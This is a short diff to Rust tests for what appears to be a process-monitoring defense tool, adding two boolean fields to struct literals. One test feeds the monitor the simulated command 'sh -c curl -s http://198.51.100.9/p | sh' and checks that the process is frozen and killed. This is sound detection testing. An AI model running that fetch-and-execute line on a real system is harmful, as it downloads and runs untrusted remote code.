@@ -40,6 +40,8 @@ fn view_from(value: &Value) -> View {
         suspects: list("suspects").iter().map(text).collect(),
         served: value["served"].as_bool().unwrap(),
         siege: value["siege"].as_bool().unwrap(),
+        jumped: false,
+        handed: false,
     }
 }
 
@@ -347,7 +349,7 @@ fn acting_at_the_event_matches_step_by_step() {
                         watcher.sensor.procs.push(Proc { pid: child as u32, ppid: proc.pid, name: "curl".into(), path: "/usr/bin/curl".into(), started: 1 });
                     }
                 }
-                let snap = Snap { proc, cmdline: text(&step["line"]), parent: text(&step["parent"]) };
+                let snap = Snap { proc, cmdline: text(&step["line"]), parent: text(&step["parent"]), jumped: false, handed: false };
                 watcher.on_exec(&snap, now);
                 pending.push(snap);
             } else {
@@ -383,7 +385,7 @@ fn a_program_ended_at_the_event_takes_what_it_started_with_it() {
     sensor.listening.insert(50);
     let mut watcher = Watcher::new(sensor, Some(scripted::Recorded::default()), &"a".repeat(64), Mode::Kill, "c:\\windows\\");
     watcher.tick(1_800_000_000.0);
-    watcher.on_exec(&Snap { proc: proc(60, 50, "dash"), cmdline: "sh -c curl -s http://198.51.100.9/p | sh".into(), parent: "python3".into() }, 1_800_000_001.0);
+    watcher.on_exec(&Snap { proc: proc(60, 50, "dash"), cmdline: "sh -c curl -s http://198.51.100.9/p | sh".into(), parent: "python3".into(), jumped: false, handed: false }, 1_800_000_001.0);
     let hands = watcher.hands.as_ref().unwrap();
     assert_eq!(hands.frozen, vec![60], "held first");
     let mut ended = hands.killed.clone();
